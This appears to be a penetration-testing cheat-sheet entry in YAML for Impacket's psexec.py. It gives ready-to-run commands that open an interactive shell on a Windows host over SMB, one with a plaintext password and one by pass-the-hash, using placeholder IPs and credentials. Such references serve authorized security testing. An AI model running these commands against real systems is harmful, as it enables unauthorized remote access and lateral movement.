---
description: |
  Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. Or can also be used to find writable shares on the target machine.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Domain controller: 10.10.10.111  

  	Username: john

  	Password: password123
    
  	--hashes: ":31d6cfe0d16ae931b73c59d7e0c089c0" (for pass the hash)

command: |
  impacket-psexec test.local/john:password123@10.10.10.1 -dc-ip 10.10.10.111

code: |
  impacket-psexec test.local/john@10.10.10.1 -hashes ":31d6cfe0d16ae931b73c59d7e0c089c0" -dc-ip 10.10.10.111


items:
  - Password
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
  - Enumeration
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
  - https://www.sans.org/blog/psexec-python-rocks/
---
